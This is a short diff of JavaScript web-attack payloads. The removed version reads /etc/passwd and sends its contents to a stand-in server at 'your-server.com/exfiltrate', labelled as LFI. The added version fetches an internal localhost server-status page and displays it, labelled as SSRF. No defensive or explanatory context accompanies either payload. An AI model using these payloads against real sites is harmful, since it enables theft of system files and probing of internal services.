@@ -1,6 +1,4 @@
-fetch('file:///etc/passwd')
+fetch('http://localhost/server-status')
   .then(response => response.text())
-  .then(text => {
-    fetch('https://your-server.com/exfiltrate?data=' + encodeURIComponent(text));  // Send file content to your server
-  })
-  .catch(error => alert('LFI Failed: ' + error.message));
+  .then(text => alert(text))
+  .catch(error => alert('SSRF Failed: ' + error.message));
